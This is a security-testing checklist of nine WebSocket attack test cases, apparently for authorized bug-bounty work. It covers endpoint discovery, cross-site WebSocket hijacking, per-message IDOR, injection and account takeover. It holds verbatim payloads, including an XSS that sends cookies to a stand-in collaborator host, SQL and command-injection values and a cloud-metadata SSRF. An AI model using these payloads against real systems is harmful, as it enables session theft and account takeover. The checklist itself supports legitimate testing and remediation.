# WebSocket — Checklist

Expert per-attack **test-case matrix** for WebSocket — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*9 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## WS-001 — Find WS endpoints + capture handshake/frames
**Test Category:** Recon &amp; Lab · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** /ws /socket /socket.io/ /cable /hub /signalr /graphql /stomp /live

**Test Steps:** 1. Find sockets: DevTools-&gt;Network-&gt;WS, grep JS for new WebSocket(/io(/SockJS(/signalr, Burp WebSockets history.<br>2. Try common paths; note framing (raw JSON / socket.io 42[...] / STOMP / SignalR / SockJS / graphql-ws / binary).<br>3. Proxy through Burp; capture a clean handshake + sample frames.

**Expected Result:** The WS endpoint(s), framing, and a captured handshake are recorded.

**Payload Example:**

```
grep JS: new WebSocket('wss://target/ws') ; framing = socket.io 42[...]
```

**Impact:** Framing and endpoint discovery gate every later test.

**Tools:** Burp WebSockets, DevTools, websocat

**References:** CWE-1385; OWASP Testing Guide: Testing WebSockets (WSTG-CLNT-10)

---

## WS-002 — Baseline the handshake (cookie vs token, Origin, wss)
**Test Category:** Baseline · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** The WS handshake + message types

**Test Steps:** 1. Is auth a Cookie (auto-sent) or a token (URL/subprotocol/first-message)?<br>2. Is Origin validated? (replay a foreign Origin + victim cookie via websocat.) Is it wss:// (TLS)? Any token in the URL?<br>3. Map message types: which carry an id, change state, are rendered to others, hit the backend (DB/cmd/URL).<br>4. Verdict: CSWSH-able / IDOR-over-WS / injection-candidate / transport-weak / locked.

**Expected Result:** The auth model, Origin handling, transport, and message-type map are known.

**Payload Example:**

```
auth = Cookie ; Origin not checked ; msg types: getMessages(read), updateEmail(state)
```

**Impact:** CSWSH needs cookie-auth + no Origin check; the map targets IDOR/injection.

**Tools:** websocat, Burp

**References:** CWE-1385; CWE-346; PortSwigger Web Security Academy: WebSockets security + Cross-site WebSocket hijacking

---

## WS-003 — Cross-Site WebSocket Hijacking (CSWSH)
**Test Category:** CSWSH · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Cookie-authenticated handshake that doesn't validate Origin

**Test Steps:** 1. Oracle: websocat with a FOREIGN Origin + the victim cookie -&gt; still connects authenticated?<br>2. Weak-allowlist bypasses: target.com.evil, eviltarget.com, controlled subdomain, null, trailing-dot/case.<br>3. PROVE in a real browser (not websocat-only): attacker-origin page, logged-in victim, default browser -&gt; handshake Origin: attacker accepted authed.

**Expected Result:** A cross-origin page opens an authenticated WebSocket as the victim (real browser).

**Payload Example:**

```
new WebSocket('$WS') from $ATTACKER page (victim cookie auto-attaches) -> connects authed
```

**Impact:** Cross-origin authenticated WS -&gt; read victim data / act as victim. High.

**Tools:** websocat, browser PoC

**References:** CWE-1385; CWE-346; PortSwigger Web Security Academy: WebSockets security + Cross-site WebSocket hijacking

---

## WS-004 — Per-message authz / IDOR / BFLA in frames
**Test Category:** Per-Message Authz · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Message fields carrying ids / privileged actions

**Test Steps:** 1. Connect as A, send a frame with B's id: {"type":"getMessages","conversationId":$BID} -&gt; B's data?<br>2. Privileged types (BFLA): {"type":"adminBroadcast"} as a normal user.<br>3. Channel/topic authz: subscribe to user.$BID / admin channel. Unauth: try the above with no auth.

**Expected Result:** A frame with another user's id / a privileged type returns data or acts.

**Payload Example:**

```
{"type":"getProfile","userId":$BID} ; {"type":"subscribe","channel":"admin"}
```

**Impact:** Cross-user read/act / function-level bypass over WS - High.

**Tools:** Burp WS Repeater

**References:** CWE-1385; CWE-639; HackTricks: Cross-Site WebSocket Hijacking

---

## WS-005 — Message injection (XSS/SQLi/NoSQLi/cmdi/SSRF/traversal/mass-assign)
**Test Category:** Message Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Every WS message field (treat as untrusted)

**Test Steps:** 1. XSS (rendered to others): {"type":"chat","text":"&lt;img src=x onerror=fetch('//$COLLAB/'+document.cookie)&gt;"}.<br>2. SQLi/NoSQLi: {"q":"' OR '1'='1"} ; {"id":{"$ne":null}}.<br>3. cmdi/SSRF: {"format":"pdf; sleep 10"} ; {"url":"http://169.254.169.254/..."}. Traversal / mass-assignment ({"role":"admin","isAdmin":true}) / type juggling.

**Expected Result:** A message field reaches a sink (XSS to others / SQL / cmd / SSRF / privileged field).

**Payload Example:**

```
{"type":"chat","text":"<svg onload=alert(document.domain)>"} ; {"url":"http://$COLLAB/ws"}
```

**Impact:** Stored XSS / SQLi / RCE / SSRF / privesc via WS frames - High/Critical.

**Tools:** Burp WS Repeater, interactsh

**References:** CWE-1385; CWE-79; CWE-89; HackTricks: Cross-Site WebSocket Hijacking

---

## WS-006 — CSWSH -&gt; account takeover
**Test Category:** Impact — ATO · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** A confirmed CSWSH endpoint with state-changing message types

**Test Steps:** 1. From the attacker-origin page, exfiltrate the victim's private data AND send a state change.<br>2. {"type":"updateEmail","email":"attacker+ws@your-inbox.test"} -&gt; reset -&gt; ATO.<br>3. Own victim account; exfil to your server; reverted.

**Expected Result:** The CSWSH reads private data and changes a recovery factor -&gt; takeover.

**Payload Example:**

```
ws.send('{"type":"updateEmail","email":"attacker+ws@your-inbox.test"}') -> reset -> ATO
```

**Impact:** Account takeover via CSWSH - Critical.

**Tools:** browser PoC

**References:** CWE-1385; CWE-640; PortSwigger Web Security Academy: WebSockets security + Cross-site WebSocket hijacking

---

## WS-007 — Rate-limit bypass over WS &amp; transport weakness
**Test Category:** Impact — Transport · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Login/OTP over WS; ws:// transport; token in URL

**Test Steps:** 1. Many login/OTP attempts on one socket -&gt; brute -&gt; ATO (measured counts).<br>2. Cleartext ws:// (no TLS) -&gt; MITM; token in the URL -&gt; leaks via logs/Referer.<br>3. Socket survives logout / token-revocation -&gt; stolen socket persists.

**Expected Result:** The socket allows brute-force, or leaks/persists credentials insecurely.

**Payload Example:**

```
loop OTP guesses on one socket ; ws:// cleartext ; token in wss URL ; socket alive after logout
```

**Impact:** OTP brute -&gt; ATO / credential exposure / persistent sessions - High.

**Tools:** Burp, websocat

**References:** CWE-1385; CWE-307; CWE-319; HackTricks: Cross-Site WebSocket Hijacking

---

## WS-008 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: 'no Origin check' with TOKEN auth (not CSWSH - token isn't auto-sent); websocat-only CSWSH (not a real-browser proof); impact-less Origin reflection; self-XSS; theoretical DoS.<br>2. REQUIRE (CSWSH): a real-browser, cross-site, authenticated connect that reads/acts. REQUIRE (IDOR/injection): two-account data-back / XSS firing in a recipient / SQL-OOB signal, reproducible.

**Expected Result:** Only cookie-auth real-browser CSWSH or reproducible IDOR/injection survives.

**Payload Example:**

```
token-auth = no CSWSH ; websocat-only = not proof ; Origin reflection w/o impact = FP
```

**Impact:** Protects credibility; WS is dense with token-auth-CSWSH and websocat-only false positives.

**Tools:** default browser

**References:** CWE-1385; PortSwigger Web Security Academy: WebSockets security + Cross-site WebSocket hijacking

---

## WS-009 — Client-facing impact &amp; SAFE PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Title names endpoint + sub-bug + impact ('CSWSH on /ws -&gt; ATO').<br>2. Provide the attacker-origin page, proof in a default browser with your own victim account (data exfil / state change), or the two-account IDOR / injection proof.<br>3. Set CVSS 3.1 + CWE-1385/346 (CSWSH) or the injection/IDOR CWE. Remediation: validate the handshake Origin against an allowlist, use a per-connection CSRF token (not just cookies), authenticate every message and enforce per-object authz, use wss://, sanitize all frame fields.<br>4. Own victim account, exfil to your server, reverted; de-dupe.

**Expected Result:** A reproducible, browser-confirmed PoC with clear remediation.

**Payload Example:**

```
PoC: attacker-origin page + default-browser proof (exfil/state change) + CVSS + CWE-1385 + remediation.
```

**Impact:** Converts the CSWSH/injection into a defensible High/Critical report.

**Tools:** CVSS calculator, WEBSOCKET_REPORT_TEMPLATE.md

**References:** CWE-1385; CWE-346; FIRST CVSS v3.1; OWASP Testing Guide: Testing WebSockets (WSTG-CLNT-10)  |  TOP REFERENCES: Christian Schneider CSWSH; PortSwigger Academy WebSockets; HackTricks; OWASP WSTG

---
